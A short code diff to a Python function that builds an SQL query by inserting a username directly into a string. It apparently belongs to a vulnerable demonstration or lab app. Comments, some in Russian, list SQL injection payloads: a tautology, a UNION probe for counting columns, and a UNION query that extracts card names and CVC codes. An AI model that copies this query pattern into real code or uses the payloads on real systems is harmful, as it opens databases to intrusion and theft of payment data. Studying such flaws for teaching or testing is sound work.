@@ -22,6 +22,9 @@ def select_raw_values(data):
     cursor = connection.cursor()
     sql = f"SELECT id, username, is_admin FROM users WHERE username='{data}'"  
     #   username' OR '1'='1
+    # число пользаков: ' UNION SELECT NULL,NULL,NULL-- (можно перебирать)
+    # union: ' UNION SELECT username, cardUserName, cvc FROM cards --
+    # 
     try:
         cursor.execute(sql)
         results = cursor.fetchall()
